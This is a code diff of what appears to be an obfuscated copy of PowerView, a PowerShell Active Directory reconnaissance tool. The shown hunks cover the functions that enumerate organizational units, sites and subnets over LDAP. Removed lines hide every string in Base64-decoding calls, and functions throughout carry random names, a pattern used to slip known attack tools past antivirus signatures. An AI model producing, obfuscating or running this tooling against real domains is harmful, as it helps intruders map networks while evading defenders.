+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $OUSearcher = vydvzz @SearcherArguments
     }
 
     PROCESS {
@@ -5507,65 +5511,65 @@ function tmesuk {
             $IdentityFilter = ''
             $Filter = ''
             $Identity | Where-Object {$_} | ForEach-Object {
-                $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
-                if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Xk9VPS4q")))) {
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
-                    if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                if ($IdentityInstance -match '^OU=.*') {
+                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
+                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                         
                         
-                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
-                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PVV0gRXh0cmFjdGVkIGRvbWFpbiAnJElkZW50aXR5RG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZQ==")))
-                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
-                        $OUSearcher = ltdynu @SearcherArguments
+                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        Write-Verbose "[Get-DomainOU] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        $SearcherArguments['Domain'] = $IdentityDomain
+                        $OUSearcher = vydvzz @SearcherArguments
                         if (-not $OUSearcher) {
-                            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PVV0gVW5hYmxlIHRvIHJldHJpZXZlIGRvbWFpbiBzZWFyY2hlciBmb3IgJyRJZGVudGl0eURvbWFpbg==")))
+                            Write-Warning "[Get-DomainOU] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
                 else {
                     try {
-                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WA==")))).PadLeft(2,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MA=="))))})) -Replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KC4uKQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XCQx")))
-                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
+                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
+                        $IdentityFilter += "(objectguid=$GuidByteString)"
                     }
                     catch {
-                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG5hbWU9JElkZW50aXR5SW5zdGFuY2Up")))
+                        $IdentityFilter += "(name=$IdentityInstance)"
                     }
                 }
             }
             if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
+                $Filter += "(|$IdentityFilter)"
             }
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BMaW5r")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PVV0gU2VhcmNoaW5nIGZvciBPVXMgd2l0aCAkR1BMaW5rIHNldCBpbiB0aGUgZ3BMaW5rIHByb3BlcnR5")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGdwbGluaz0qJEdQTGluayop")))
+            if ($PSBoundParameters['GPLink']) {
+                Write-Verbose "[Get-DomainOU] Searching for OUs with $GPLink set in the gpLink property"
+                $Filter += "(gplink=*$GPLink*)"
             }
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PVV0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXI=")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
+            if ($PSBoundParameters['LDAPFilter']) {
+                Write-Verbose "[Get-DomainOU] Using additional LDAP filter: $LDAPFilter"
+                $Filter += "$LDAPFilter"
             }
 
-            $OUSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9b3JnYW5pemF0aW9uYWxVbml0KSRGaWx0ZXIp")))
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PVV0gR2V0LURvbWFpbk9VIGZpbHRlciBzdHJpbmc6IHswfQ=="))) -f $($OUSearcher.filter))
+            $OUSearcher.filter = "(&(objectCategory=organizationalUnit)$Filter)"
+            Write-Verbose ("[Get-DomainOU] Get-DomainOU filter string: {0}" -f $($OUSearcher.filter))
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $OUSearcher.FindOne() }
+            if ($PSBoundParameters['FindOne']) { $Results = $OUSearcher.FindOne() }
             else { $Results = $OUSearcher.FindAll() }
             $Results | Where-Object {$_} | ForEach-Object {
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) {
+                if ($PSBoundParameters['Raw']) {
                     
                     $OU = $_
                 }
                 else {
-                    $OU = hfjsvm -Properties $_.Properties
+                    $OU = tsuvgg -Properties $_.Properties
                 }
-                $OU.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3Lk9V"))))
+                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                 $OU
             }
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PVV0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogezB9"))) -f $_)
+                    Write-Verbose ("[Get-DomainOU] Error disposing of the Results object: {0}" -f $_)
                 }
             }
             $OUSearcher.dispose()
@@ -5574,7 +5578,7 @@ function tmesuk {
 }
 
 
-function aetbwl {
+function beqjfr {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -5616,7 +5620,7 @@ function aetbwl {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -5647,19 +5651,19 @@ function aetbwl {
 
     BEGIN {
         $SearcherArguments = @{
-            'SearchBasePrefix' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q049U2l0ZXMsQ049Q29uZmlndXJhdGlvbg==")))
+            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-        $SiteSearcher = ltdynu @SearcherArguments
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $SiteSearcher = vydvzz @SearcherArguments
     }
 
     PROCESS {
@@ -5667,65 +5671,65 @@ function aetbwl {
             $IdentityFilter = ''
             $Filter = ''
             $Identity | Where-Object {$_} | ForEach-Object {
-                $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
-                if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkNOPS4q")))) {
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
-                    if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                if ($IdentityInstance -match '^CN=.*') {
+                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
+                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                         
                         
-                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
-                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TaXRlXSBFeHRyYWN0ZWQgZG9tYWluICckSWRlbnRpdHlEb21haW4nIGZyb20gJyRJZGVudGl0eUluc3RhbmNl")))
-                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
-                        $SiteSearcher = ltdynu @SearcherArguments
+                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        Write-Verbose "[Get-DomainSite] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        $SearcherArguments['Domain'] = $IdentityDomain
+                        $SiteSearcher = vydvzz @SearcherArguments
                         if (-not $SiteSearcher) {
-                            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TaXRlXSBVbmFibGUgdG8gcmV0cmlldmUgZG9tYWluIHNlYXJjaGVyIGZvciAnJElkZW50aXR5RG9tYWlu")))
+                            Write-Warning "[Get-DomainSite] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
                 else {
                     try {
-                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WA==")))).PadLeft(2,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MA=="))))})) -Replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KC4uKQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XCQx")))
-                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
+                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
+                        $IdentityFilter += "(objectguid=$GuidByteString)"
                     }
                     catch {
-                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG5hbWU9JElkZW50aXR5SW5zdGFuY2Up")))
+                        $IdentityFilter += "(name=$IdentityInstance)"
                     }
                 }
             }
             if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
+                $Filter += "(|$IdentityFilter)"
             }
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BMaW5r")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TaXRlXSBTZWFyY2hpbmcgZm9yIHNpdGVzIHdpdGggJEdQTGluayBzZXQgaW4gdGhlIGdwTGluayBwcm9wZXJ0eQ==")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGdwbGluaz0qJEdQTGluayop")))
+            if ($PSBoundParameters['GPLink']) {
+                Write-Verbose "[Get-DomainSite] Searching for sites with $GPLink set in the gpLink property"
+                $Filter += "(gplink=*$GPLink*)"
             }
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TaXRlXSBVc2luZyBhZGRpdGlvbmFsIExEQVAgZmlsdGVyOiAkTERBUEZpbHRlcg==")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
+            if ($PSBoundParameters['LDAPFilter']) {
+                Write-Verbose "[Get-DomainSite] Using additional LDAP filter: $LDAPFilter"
+                $Filter += "$LDAPFilter"
             }
 
-            $SiteSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9c2l0ZSkkRmlsdGVyKQ==")))
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TaXRlXSBHZXQtRG9tYWluU2l0ZSBmaWx0ZXIgc3RyaW5nOiB7MH0="))) -f $($SiteSearcher.filter))
+            $SiteSearcher.filter = "(&(objectCategory=site)$Filter)"
+            Write-Verbose ("[Get-DomainSite] Get-DomainSite filter string: {0}" -f $($SiteSearcher.filter))
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $SiteSearcher.FindAll() }
+            if ($PSBoundParameters['FindOne']) { $Results = $SiteSearcher.FindAll() }
             else { $Results = $SiteSearcher.FindAll() }
             $Results | Where-Object {$_} | ForEach-Object {
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) {
+                if ($PSBoundParameters['Raw']) {
                     
                     $Site = $_
                 }
                 else {
-                    $Site = hfjsvm -Properties $_.Properties
+                    $Site = tsuvgg -Properties $_.Properties
                 }
-                $Site.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlNpdGU="))))
+                $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                 $Site
             }
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TaXRlXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0")))
+                    Write-Verbose "[Get-DomainSite] Error disposing of the Results object"
                 }
             }
             $SiteSearcher.dispose()
@@ -5734,7 +5738,7 @@ function aetbwl {
 }
 
 
-function ulaltl {
+function awdysq {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -5775,7 +5779,7 @@ function ulaltl {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -5806,19 +5810,19 @@ function ulaltl {
 
     BEGIN {
         $SearcherArguments = @{
-            'SearchBasePrefix' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q049U3VibmV0cyxDTj1TaXRlcyxDTj1Db25maWd1cmF0aW9u")))
+            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-        $SubnetSearcher = ltdynu @SearcherArguments
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $SubnetSearcher = vydvzz @SearcherArguments
     }
 
     PROCESS {
@@ -5826,62 +5830,62 @@ function ulaltl {
             $IdentityFilter = ''
             $Filter = ''
             $Identity | Where-Object {$_} | ForEach-Object {
-                $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
-                if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkNOPS4q")))) {
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
-                    if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                if ($IdentityInstance -match '^CN=.*') {
+                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
+                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                         
                         
-                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
-                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TdWJuZXRdIEV4dHJhY3RlZCBkb21haW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2U=")))
-                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
-                        $SubnetSearcher = ltdynu @SearcherArguments
+                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        Write-Verbose "[Get-DomainSubnet] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        $SearcherArguments['Domain'] = $IdentityDomain
+                        $SubnetSearcher = vydvzz @SearcherArguments
                         if (-not $SubnetSearcher) {
-                            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TdWJuZXRdIFVuYWJsZSB0byByZXRyaWV2ZSBkb21haW4gc2VhcmNoZXIgZm9yICckSWRlbnRpdHlEb21haW4=")))
+                            Write-Warning "[Get-DomainSubnet] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
                 else {
                     try {
-                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WA==")))).PadLeft(2,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MA=="))))})) -Replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KC4uKQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XCQx")))
-                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
+                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
